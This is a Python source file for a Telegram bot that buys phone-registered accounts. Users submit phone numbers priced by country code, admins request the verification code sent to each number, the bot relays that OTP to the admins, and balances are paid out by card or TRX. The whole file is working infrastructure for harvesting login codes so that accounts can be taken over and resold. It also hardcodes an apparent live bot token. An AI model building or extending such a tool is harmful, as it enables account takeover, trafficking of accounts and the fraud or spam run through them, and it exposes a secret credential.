import os
import json
import datetime
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    ContextTypes, filters
)

# ================== CONFIG ==================
BOT_TOKEN = "8266639049:AAFvQYw-ax6y94S2zH_oMg7jA2Q1Dxh6yro"
CHANNEL_LINK = "https://t.me/NR_receiver_News"

# Two admins
ADMIN_IDS = {1378825382, 7780307520}

# Storage files (local JSON)
USER_FILE = "users.json"
ORDER_FILE = "orders.json"

# ================== UPDATED PRICE MAP (you requested these new amounts) ==================
PRICE_MAP = {
    "+886": 2.10,  # Taiwan
    "+46": 1.60,   # Norway
    "+31": 2.10,   # Netherlands
    "+34": 3.10,   # Spain
    "+48": 1.40,   # Poland
    "+853": 1.55,  # Macau
    "+40": 1.55,   # Romania
    "+30": 1.70,   # Greece
    "+994": 1.20,  # Azerbaijan
    "+216": 0.60,  # Tunisia
    "+49": 3.10,   # Germany
    "+43": 1.60,   # Austria
    "+420": 1.65,  # Czech Republic
    "+353": 1.55,  # Ireland
    "+351": 1.80,  # Portugal
    "+505": 0.85,  # Nicaragua
    "+595": 1.00,  # Paraguay
    "+63": 0.63,   # Philippines
    "+970": 0.85,  # Palestine
    "+972": 0.80,  # Israel
    "+593": 0.90,  # Ecuador
    "+966": 1.95   # Saudi Arabia
}

# ================== UPDATED CAP TEXT ==================
CAP_TEXT = """📋 Available Countries

🇹🇼 +886 | Taiwan | 💰 2.10$
🇳🇴 +46  | Norway | 💰 1.60$
🇳🇱 +31  | Netherlands | 💰 2.10$
🇪🇸 +34  | Spain | 💰 3.10$
🇵🇱 +48  | Poland | 💰 1.40$
🇲🇴 +853 | Macau | 💰 1.55$
🇷🇴 +40  | Romania | 💰 1.55$
🇬🇷 +30  | Greece | 💰 1.70$
🇦🇿 +994 | Azerbaijan | 💰 1.20$
🇹🇳 +216 | Tunisia | 💰 0.60$
🇩🇪 +49  | Germany | 💰 3.10$
🇦🇹 +43  | Austria | 💰 1.60$
🇨🇿 +420 | Czech Republic | 💰 1.65$
🇮🇪 +353 | Ireland | 💰 1.55$
🇵🇹 +351 | Portugal | 💰 1.80$
🇳🇮 +505 | Nicaragua | 💰 0.85$
🇵🇾 +595 | Paraguay | 💰 1.00$
🇵🇭 +63  | Philippines | 💰 0.63$
🇵🇸 +970 | Palestine | 💰 0.85$
🇮🇱 +972 | Israel | 💰 0.80$
🇪🇨 +593 | Ecuador | 💰 0.90$
🇸🇦 +966 | Saudi Arabia | 💰 1.95$

🌍 Total Countries: 22
"""

# ================== STORAGE HELPERS ==================
def ensure_file(path: str):
    if not os.path.exists(path):
        with open(path, "w") as f:
            json.dump({}, f)

def load_json(path: str):
    ensure_file(path)
    with open(path, "r") as f:
        try:
            return json.load(f)
        except json.JSONDecodeError:
            return {}

def save_json(path: str, data: dict):
    with open(path, "w") as f:
        json.dump(data, f, indent=2)

ensure_file(USER_FILE)
ensure_file(ORDER_FILE)

# ================== UTILS ==================
def utc_now_str():
    return datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")

def get_price_for_number(number: str) -> float:
    # match the LONGEST prefix present in PRICE_MAP
    number = number.strip()
    best_price = 0.0
    best_len = -1
    for prefix, price in PRICE_MAP.items():
        if number.startswith(prefix) and len(prefix) > best_len:
            best_len = len(prefix)
            best_price = price
    return best_price

async def send_to_admins(context: ContextTypes.DEFAULT_TYPE, text: str, reply_markup=None):
    for admin_id in ADMIN_IDS:
        try:
            await context.bot.send_message(chat_id=admin_id, text=text, reply_markup=reply_markup)
        except Exception:
            pass

# ================== COMMANDS ==================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    users = load_json(USER_FILE)
    uid = str(update.effective_user.id)
    if uid not in users:
        users[uid] = {
            "name": update.effective_user.full_name,
            "balance": 0.0,
            "sold": 0
        }
        save_json(USER_FILE, users)
        # First time: ask to join channel
        kb = [
            [InlineKeyboardButton("📢 Join Channel", url=CHANNEL_LINK)],
            [InlineKeyboardButton("➡️ Continue to Menu", callback_data="continue_menu")]
        ]
        await update.message.reply_text("👋 Welcome! Please join our channel first:", reply_markup=InlineKeyboardMarkup(kb))
        return

    # Returning: show the input instructions
    await update.message.reply_text(
        "🎉 Welcome to Robot!\n\n"
        "Enter your phone number with the country code.\n"
        "Example: +62xxxxxxx\n\n"
        "Type /cap to see available countries."
    )

async def cap(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(CAP_TEXT)

async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    users = load_json(USER_FILE)
    uid = str(update.effective_user.id)
    if uid not in users:
        await update.message.reply_text("❌ Please use /start first.")
        return
    u = users[uid]
    text = (f"👤 Name: {u['name']}\n"
            f"💰 Balance: ${u['balance']:.2f}\n"
            f"📱 Accounts Sold: {u['sold']}\n"
            f"🕒 Time: {utc_now_str()}")
    kb = [[InlineKeyboardButton("💸 Withdraw", callback_data="withdraw")]]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb))

async def cancel_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    orders = load_json(ORDER_FILE)
    uid = str(update.effective_user.id)
    # cancel the first non-completed order of user
    found = None
    for oid, od in list(orders.items()):
        if od.get("user_id") == uid and od.get("status") not in ("completed", "rejected", "cancelled"):
            orders[oid]["status"] = "cancelled"
            found = oid
            break
    save_json(ORDER_FILE, orders)
    if found:
        await update.message.reply_text(f"✅ Your pending sell (Order {found}) has been cancelled.")
        # notify admins
        await send_to_admins(context, f"ℹ️ User {uid} cancelled Order {found}.")
    else:
        await update.message.reply_text("ℹ️ You have no pending sell to cancel.")

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Use /start, /cap, /balance, /cancel.")

# ================== CALLBACKS ==================
# User-facing callbacks (join/continue & withdraw)
async def user_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    users = load_json(USER_FILE)
    uid = str(query.from_user.id)

    if data == "continue_menu":
        # Mark joined (soft flag, not enforced)
        if uid in users:
            users[uid]["joined"] = True
            save_json(USER_FILE, users)
        await query.edit_message_text(
            "🎉 Welcome to Robot!\n\n"
            "Enter your phone number with the country code.\n"
            "Example: +62xxxxxxx\n\n"
            "Type /cap to see available countries."
        )
        return

    if data == "withdraw":
        if uid not in users:
            await query.edit_message_text("❌ Please /start first.")
            return
        bal = users[uid]["balance"]
        if bal < 3:
            await query.edit_message_text("⚠️ Insufficient balance (minimum $3).")
        else:
            # Present withdrawal method choices
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("💳 Withdrawal Card", callback_data="withdraw_card")],
                [InlineKeyboardButton("💎 Withdrawal TRX", callback_data="withdraw_trx")]
            ])
            await query.edit_message_text("How you want to withdraw:", reply_markup=kb)
        return

    # If user clicked withdrawal card
    if data == "withdraw_card":
        uid = str(query.from_user.id)
        # store chosen method in per-user context
        context.user_data["withdraw_method"] = "Card"
        # ask user to send card info via message
        await query.edit_message_text("✅ Send your card info")
        return

    # If user clicked withdrawal TRX
    if data == "withdraw_trx":
        uid = str(query.from_user.id)
        context.user_data["withdraw_method"] = "TRX"
        await query.edit_message_text("✅ Send your TRX address")
        return

    # Confirm withdraw yes
    if data == "confirm_withdraw_yes":
        uid = str(query.from_user.id)
        users = load_json(USER_FILE)
        if uid not in users:
            await query.edit_message_text("❌ Please /start first.")
            return
        method = context.user_data.get("withdraw_method", "Unknown")
        address = context.user_data.get("withdraw_address", "N/A")
        bal = users[uid]["balance"]

        # Deduct balance
        users[uid]["balance"] = 0.0
        save_json(USER_FILE, users)

        # Notify user and admins
        await query.edit_message_text("✅ Your withdrawal request has been sent to admin.")
        await send_to_admins(
            context,
            text=(
                f"💸 Withdrawal Request\n"
                f"User: {users[uid].get('name','User')} ({uid})\n"
                f"Method: {method}\n"
                f"Address/Info: {address}\n"
                f"Amount: ${bal:.2f}\n"
                f"Time: {utc_now_str()}"
            )
        )
        # Clear withdraw context
        context.user_data.pop("withdraw_method", None)
        context.user_data.pop("withdraw_address", None)
        return

    # Confirm withdraw no
    if data == "confirm_withdraw_no":
        # Cancel withdrawal process
        context.user_data.pop("withdraw_method", None)
        context.user_data.pop("withdraw_address", None)
        await query.edit_message_text("❌ Withdrawal cancelled.")
        return

# Admin-only callbacks for order actions
async def admin_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    from_id = query.from_user.id

    # Only admins can perform these
    if from_id not in ADMIN_IDS:
        await query.answer("Not authorized", show_alert=True)
        return

    orders = load_json(ORDER_FILE)
    users = load_json(USER_FILE)

    # Expected data formats:
    # admin_request_<order_id>
    # admin_cancel_<order_id>   (or admin_reject_<order_id>)
    # admin_reject_<order_id>
    # admin_retry_<order_id>
    # admin_approve_<order_id>

    try:
        action, _, order_id = data.partition("_")[2].partition("_")
        # Above is a bit quirky; easier to split:
    except Exception:
        # Simpler robust parsing:
        parts = data.split("_", 2)
        if len(parts) < 3:
            return
        action = parts[1]
        order_id = parts[2]

    if order_id not in orders:
        await query.answer("Order not found", show_alert=True)
        return

    order = orders[order_id]
    user_id = order["user_id"]

    if data.startswith("admin_request_"):
        orders[order_id]["status"] = "otp_requested"
        save_json(ORDER_FILE, orders)
        await context.bot.send_message(chat_id=int(user_id), text=f"🇹🇼 Enter the code sent to the number {order['phone']}")
        await query.edit_message_text(f"✅ OTP requested for Order {order_id}")

    elif data.startswith("admin_cancel_") or data.startswith("admin_reject_"):
        orders[order_id]["status"] = "rejected"
        save_json(ORDER_FILE, orders)
        await context.bot.send_message(chat_id=int(user_id), text="❌ Your deal has been cancelled by admin.")
        await query.edit_message_text(f"❌ Order {order_id} cancelled")

    elif data.startswith("admin_retry_"):
        orders[order_id]["status"] = "otp_requested"
        save_json(ORDER_FILE, orders)
        await context.bot.send_message(chat_id=int(user_id), text=f"🔄 Please send another OTP for {order['phone']}.")
        await query.edit_message_text(f"🔄 Another OTP requested for Order {order_id}")

    elif data.startswith("admin_approve_"):
        # Credit based on prefix
        price = get_price_for_number(order["phone"])
        users.setdefault(user_id, {"name": f"User {user_id}", "balance": 0.0, "sold": 0})
        users[user_id]["balance"] = float(users[user_id].get("balance", 0.0)) + float(price)
        users[user_id]["sold"] = int(users[user_id].get("sold", 0)) + 1
        save_json(USER_FILE, users)

        orders[order_id]["status"] = "completed"
        orders[order_id]["price"] = price
        orders[order_id]["completed_at"] = utc_now_str()
        save_json(ORDER_FILE, orders)

        await context.bot.send_message(chat_id=int(user_id), text=f"✅ Your account has been successfully sold!\n💰 ${price:.2f} credited to your balance.")
        await query.edit_message_text(f"✅ Order {order_id} approved. User credited ${price:.2f}.")

# ================== MESSAGE HANDLER ==================
async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (update.message.text or "").strip()
    uid = str(update.effective_user.id)

    # ---- Withdraw flow: if user already chose method but not yet provided address/info ----
    # We store 'withdraw_method' in context.user_data when they click withdraw_card/withdraw_trx
    if "withdraw_method" in context.user_data and "withdraw_address" not in context.user_data:
        # Save the provided text as address/card info
        context.user_data["withdraw_address"] = text

        # Ask for confirmation with inline Yes/No
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Yes", callback_data="confirm_withdraw_yes"),
             InlineKeyboardButton("❌ No", callback_data="confirm_withdraw_no")]
        ])

        await update.message.reply_text(
            "❗️ Verify your address is correct, you cannot change it\n\n"
            f"❗️Are you sure about your {context.user_data['withdraw_method']} number/address and request?\n\n"
            f"{text}",
            reply_markup=kb
        )
        return

    # ---- If it's a phone number submission ----
    if text.startswith("+") and text[1:].isdigit():
        users = load_json(USER_FILE)
        orders = load_json(ORDER_FILE)

        # Reject if number already COMPLETED before
        for o in orders.values():
            if o.get("phone") == text and o.get("status") == "completed":
                await update.message.reply_text("❌ This number has already been sold.")
                return

        # Create new order
        order_id = str(len(orders) + 1)
        orders[order_id] = {
            "id": order_id,
            "user_id": uid,
            "phone": text,
            "status": "pending",
            "created_at": utc_now_str()
        }
        save_json(ORDER_FILE, orders)

        await update.message.reply_text("⏳ Processing please wait. OTP will be requested within 10 minutes. Stay active to avoid rejection.")

        # Send admin controls (to ALL admins)
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Request OTP", callback_data=f"admin_request_{order_id}")],
            [InlineKeyboardButton("❌ Cancel Deal", callback_data=f"admin_cancel_{order_id}")]
        ])
        await send_to_admins(
            context,
            text=f"📩 New number submitted\nUser: {update.effective_user.full_name} ({uid})\nPhone: {text}\nOrder: {order_id}",
            reply_markup=kb
        )
        return

    # ---- If user has otp_requested order, treat message as OTP ----
    orders = load_json(ORDER_FILE)
    pending = [o for o in orders.values() if o.get("user_id") == uid and o.get("status") == "otp_requested"]
    if pending:
        order = pending[0]
        order_id = order["id"]
        orders[order_id]["otp"] = text
        orders[order_id]["status"] = "otp_submitted"
        orders[order_id]["otp_submitted_at"] = utc_now_str()
        save_json(ORDER_FILE, orders)

        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 Request Another Code", callback_data=f"admin_retry_{order_id}")],
            [InlineKeyboardButton("✅ Approve", callback_data=f"admin_approve_{order_id}")],
            [InlineKeyboardButton("❌ Reject", callback_data=f"admin_reject_{order_id}")]
        ])
        # Send to admins
        await send_to_admins(
            context,
            text=f"🔐 OTP received for Order {order_id}\nPhone: {order['phone']}\nOTP: {text}",
            reply_markup=kb
        )
        await update.message.reply_text("✅ OTP received. Please wait for admin review.")
        return

    # Otherwise
    await update.message.reply_text("⚠️ Message not recognized. Send a phone number (+countrycode) or use /cap.")

# ================== HEALTH SERVER (for Render Web Service) ==================
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

def start_health_server():
    port = int(os.environ.get("PORT", "10000"))
    server = HTTPServer(("0.0.0.0", port), HealthHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()

# ================== MAIN ==================
def main():
    # Start tiny HTTP server so Render sees an open port
    start_health_server()

    application = Application.builder().token(BOT_TOKEN).build()

    # Commands
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("cap", cap))
    application.add_handler(CommandHandler("balance", balance))
    application.add_handler(CommandHandler("cancel", cancel_cmd))
    application.add_handler(CommandHandler("help", help_cmd))

    # Callback query handlers with patterns to avoid conflicts
    # include withdraw related patterns
    application.add_handler(CallbackQueryHandler(
        user_buttons,
        pattern=r"^(continue_menu|withdraw|withdraw_card|withdraw_trx|confirm_withdraw_yes|confirm_withdraw_no)$"
    ))
    application.add_handler(CallbackQueryHandler(
        admin_buttons,
        pattern=r"^admin_(request|cancel|reject|retry|approve)_[0-9]+$"
    ))

    # Messages
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))

    print("Bot running with POLLING + health server...")
    application.run_polling(allowed_updates=["message", "callback_query"])

if __name__ == "__main__":
    main()
